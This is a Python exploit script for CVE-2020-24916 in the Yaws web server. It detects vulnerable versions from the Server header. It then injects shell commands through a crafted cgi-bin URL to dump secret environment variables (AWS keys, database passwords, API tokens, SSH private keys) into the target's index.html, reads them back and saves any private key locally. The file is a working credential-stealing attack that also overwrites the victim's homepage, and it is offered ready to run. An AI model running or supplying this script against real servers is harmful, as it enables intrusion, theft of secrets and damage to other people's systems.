#########################################
# CVE-2020-24916 
# Yet another web server (Yaws) Code Injection
#
# This script performs the following actions:
# - Extracts environment variables from the target machine if it is vulnerable.
# - If an SSH Private Key is found, it will be saved as id_rsa_{target_ip}.
#
# van0

import requests
import urllib.parse
from time import sleep
import os

CVE = "CVE-2020-24916"

env_vars = [
    "USER",
    "HOME",
    "PATH",
    "HOSTNAME",
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "DB_USER",
    "DB_PASSWORD",
    "DB_HOST",
    "DB_PORT",
    "DB_NAME",
    "API_KEY",
    "API_SECRET",
    "JWT_SECRET",
    "OAUTH_TOKEN",
    "OAUTH_TOKEN_SECRET",
    "GITHUB_TOKEN",
    "SLACK_API_TOKEN",
    "MAILGUN_API_KEY",
    "SENDGRID_API_KEY",
    "STRIPE_API_KEY",
    "SSH_PRIVATE_KEY",
    "SSH_PUBLIC_KEY",
    "TWILIO_API_KEY",
    "TWILIO_AUTH_TOKEN"
]

def check_vulnerability(target, port):
    response = requests.get(f"http://{target}:{port}")
    if 'Yaws' in response.headers.get('Server', ''):
        yaws_version = response.headers.get('Server').split(' ')[1]
        if yaws_version <= "2.0.6":
            print(f"[+] Target {yaws_version} is vulnerable to {CVE}")
            return True
        else:
            print(f"[-] Target {yaws_version} is not vulnerable to this attack")
            return False
    else:
        print(f"[-] Could not detect Yaws server version, exiting")
        return False

def exploit(target, port):
    if not check_vulnerability(target, port):
        return

    script_directory = os.path.dirname(os.path.abspath(__file__))
    extracted_keys_directory = os.path.join(script_directory, "extracted_keys")
    if not os.path.exists(extracted_keys_directory):
        os.makedirs(extracted_keys_directory)

    for var in env_vars:
        payload = f'export Z=$(pwd|cut -c1);echo ${var}>..$Z""index.html'
        encoded_payload = urllib.parse.quote(payload)
        url = f'http://{target}:{port}/cgi-bin/"`{encoded_payload}`"'

        print(f"[+] Trying to extract {var} variable")
        try:
            response = requests.get(url)

            index_url = f'http://{target}:{port}/index.html'
            index_response = requests.get(index_url)

            if index_response.text.strip():
                print(f"[+] Success: {index_response.text}")

                if var == "SSH_PRIVATE_KEY":
                    file_path = os.path.join(extracted_keys_directory, f"id_rsa_{target}")
                    with open(file_path, "w") as f:
                        f.write(index_response.text)
                        print(f"[+] SSH_PRIVATE_KEY saved to {file_path}")

            else:
                print(f"[-] Failed")
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to extract {var} variable due to {str(e)}")

        sleep(1)

if __name__ == "__main__":
    target = input("Enter target IP: ")
    port = input("Enter target port: ")
    exploit(target, port)

